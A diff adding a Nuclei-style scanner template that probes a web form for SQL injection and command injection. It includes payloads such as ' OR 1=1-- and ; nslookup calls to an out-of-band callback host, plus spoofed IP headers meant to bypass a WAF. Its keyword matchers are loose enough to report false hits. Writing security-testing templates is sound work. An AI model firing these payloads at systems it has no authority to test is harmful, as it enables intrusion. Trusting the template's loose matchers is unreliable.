@@ -1,0 +1,83 @@
+id: sqli-rce-waf-bypass
+
+info:
+  name: Advanced SQLi and RCE Detection with WAF Bypass
+  author: akm626
+  severity: critical
+  description: |
+    This template detects SQL Injection and Remote Code Execution vulnerabilities while attempting to bypass WAF protections using advanced payloads and spoofing headers.
+  tags: sqli,rce,waf-bypass,dast
+
+variables:
+  marker: "{{interactsh-url}}"
+  sql_payloads:
+    - "' OR 1=1--"
+    - "' AND 1=1--"
+    - "' UNION SELECT NULL, NULL--"
+    - "' UNION SELECT @@version--"
+  rce_payloads:
+    - "; nslookup {{marker}}"
+    - "| nslookup {{marker}}"
+    - "$(nslookup {{marker}})"
+    - "`nslookup {{marker}}`"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-For: "{{rand_ip}}"
+      X-Originating-IP: "{{rand_ip}}"
+      X-Remote-IP: "{{rand_ip}}"
+      X-Client-IP: "{{rand_ip}}"
+      Referer: "{{BaseURL}}"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
+    body: "param={{payload}}"
+
+    payloads:
+      payload:
+        - '{{sql_payloads}}'
+        - '{{rce_payloads}}'
+
+    stop-at-first-match: true
+    threads: 5
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "database error"
+          - "MySQL"
+        part: body
+
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
+
+      - type: regex
+        regex:
+          - "(\\bselect\\b|\\bunion\\b|\\bupdate\\b|\\binsert\\b|\\bdelete\\b)"
+        part: body
+
+    extractors:
+      - type: regex
+        name: detected_sql
+        regex:
+          - "(SQL syntax|database error|MySQL)"
+        part: body
+      - type: regex
+        name: detected_command
+        regex:
+          - "(nslookup|dns)"
+        part: body
+      - type: regex
+        name: sql_keywords
+        regex:
+          - "(\\bselect\\b|\\bunion\\b|\\bupdate\\b|\\binsert\\b|\\bdelete\\b)"
+        part: body
+      - type: dsl
+        name: response_timing
+        dsl:
+          - "len(body)>100" # Example DSL matcher for response length.
